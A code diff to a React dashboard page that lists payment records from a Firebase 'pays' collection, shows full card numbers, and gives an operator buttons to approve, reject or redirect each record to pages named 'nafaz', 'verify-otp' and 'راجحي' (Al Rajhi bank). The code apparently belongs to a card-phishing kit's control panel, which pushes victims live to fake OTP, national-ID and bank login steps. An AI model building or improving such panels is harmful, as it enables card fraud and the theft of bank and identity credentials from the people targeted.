@@ -309,6 +309,7 @@ export default function NotificationsPage1() {
       const targetPost = doc(db, "pays", id);
       await updateDoc(targetPost, {
         status: state,
+        paymentstauts: state,
       });
 
       // Update local state
@@ -1341,7 +1342,7 @@ export default function NotificationsPage1() {
                   <span className="text-xs text-blue-100 mb-1 block">
                     رقم البطاقة
                   </span>
-                  <span className="font-mono text-lg tracking-wider">
+                  <span className="font-mono text-lg tracking-wider" dir="ltr">
                     {selectedCardInfo.card_number ||
                       (selectedCardInfo.formData &&
                         selectedCardInfo.formData.card_number) ||
@@ -1406,29 +1407,28 @@ export default function NotificationsPage1() {
             </div>
           )}
 
-          <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t">
+          <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t gap-2">
             {selectedCardInfo?.card_number ? (
               <>
                 {" "}
                 <Button
                   onClick={() => {
                     selectedCardInfo &&
-                      handleUpdatePagename(selectedCardInfo.id, "nafaz");
-                    handleApproval("approved", selectedCardInfo.id);
+                      handleApproval("rejected", selectedCardInfo.id);
                   }}
-                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
+                  className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
                 >
-                  نفاذ{" "}
+                  رفض{" "}
                 </Button>
                 <Button
                   onClick={() => {
                     selectedCardInfo &&
-                      handleUpdatePagename(selectedCardInfo.id, "verify-phone");
+                      handleUpdatePagename(selectedCardInfo.id, "verify-otp");
                     handleApproval("approved", selectedCardInfo.id);
                   }}
-                  className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-green-600 hover:to-yellow-700 text-white border-0 shadow-md"
+                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
                 >
-                  رمز الهاتف
+                  قبول
                 </Button>
                 <Button
                   onClick={() => {
@@ -1449,7 +1449,7 @@ export default function NotificationsPage1() {
                       );
                     handleApproval("approved", selectedCardInfo.id);
                   }}
-                  className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
+                  className="w-full bg-gradient-to-r from-blue-500 to-red-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
                 >
                   راجحي
                 </Button>
